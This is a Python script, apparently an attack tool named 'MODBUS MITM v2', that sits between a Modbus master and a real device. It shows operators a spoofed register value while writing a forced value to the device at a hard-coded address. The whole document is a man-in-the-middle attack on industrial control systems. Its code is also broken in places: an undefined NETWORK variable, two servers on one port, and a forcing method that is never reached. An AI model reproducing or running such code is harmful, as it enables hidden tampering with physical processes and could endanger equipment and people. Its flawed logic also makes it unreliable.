#!/usr/bin/env python3
import threading
import sys
import time
from pymodbus.server import Server
from pymodbus.client import ModbusTcpClient
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from pymodbus.datastore.datastore import ModbusSequentialDataBlock

# ═══════════════════════════════════════════════════════════════
LISTEN_PORT = 502
TARGET_REGISTER = 2
FAKE_VALUE = 500        
FORCE_VALUE = 999       
REAL_SLAVE_IP = "172.16.4.51"  
REAL_SLAVE_PORT = 502
# ═══════════════════════════════════════════════════════════════

class LogBlock(ModbusSequentialDataBlock):
    def __init__(self, address, values):
        super().__init__(address, values)
        self._name = "UNKNOWN"
    
    def getValues(self, address, count=1):
        vals = super().getValues(address, count)
        print(f"🟢 [READ {self._name}] addr={address} -> {vals}")
        return vals

    def setValues(self, address, values):
        print(f"🔴 [WRITE {self._name}] addr={address} values={values}")
        super().setValues(address, values)
        return True

class MasterFacingSlave:
    def __init__(self):
        print("🤖 Starting FAKE SLAVE (for master)")
        block = LogBlock(0, [0] * 100)
        block.setValues(TARGET_REGISTER, [FAKE_VALUE])
        block._name = "FAKE_SLAVE"
        store = ModbusSlaveContext(hr=block)
        self.context = ModbusServerContext(slaves=store, single=True)

class SlaveFacingMaster:
    def __init__(self):
        print("👑 Starting FAKE MASTER (for real slave)")
        self.real_client = ModbusTcpClient(REAL_SLAVE_IP, port=REAL_SLAVE_PORT)
        if not self.real_client.connect():
            print(f"❌ Cannot connect to real slave {REAL_SLAVE_IP}:{REAL_SLAVE_PORT}")
            sys.exit(1)
        
        block = LogBlock(0, [0] * 100)
        block._name = "FAKE_MASTER"
        store = ModbusSlaveContext(hr=block)
        self.context = ModbusServerContext(slaves=store, single=True)

    def setValues(self, address, values):
        if address == TARGET_REGISTER:
            print(f"⚡ FORWARDING {FORCE_VALUE} to REAL slave HR[{TARGET_REGISTER}]")
            self.real_client.write_register(TARGET_REGISTER, FORCE_VALUE, unit=1)
            self.real_client.close()
            self.real_client.connect()
        return super().setValues(address, values)

def start_master_facing():
    server = MasterFacingSlave()
    print(f"🌐 Fake Slave listening on 0.0.0.0:{LISTEN_PORT} (for {NETWORK['MASTER_IP']})")
    Server.serve_tcp(context=server.context, address=("0.0.0.0", LISTEN_PORT), threaded=True)

def start_slave_facing():
    server = SlaveFacingMaster()
    print(f"🌐 Fake Master listening on 0.0.0.0:{LISTEN_PORT} (for {NETWORK['SLAVE_IP']})")  
    Server.serve_tcp(context=server.context, address=("0.0.0.0", LISTEN_PORT), threaded=True)

if __name__ == "__main__":
    print("🚀 MODBUS MITM v2 - PyModbus 3.6.4")
    print(f"   Master sees: {FAKE_VALUE} on reg {TARGET_REGISTER}")
    print(f"   Real slave gets: {FORCE_VALUE} written to reg {TARGET_REGISTER}")
    
    t1 = threading.Thread(target=start_master_facing, daemon=True)
    t2 = threading.Thread(target=start_slave_facing, daemon=True)
    
    t1.start()
    t2.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        sys.exit(0)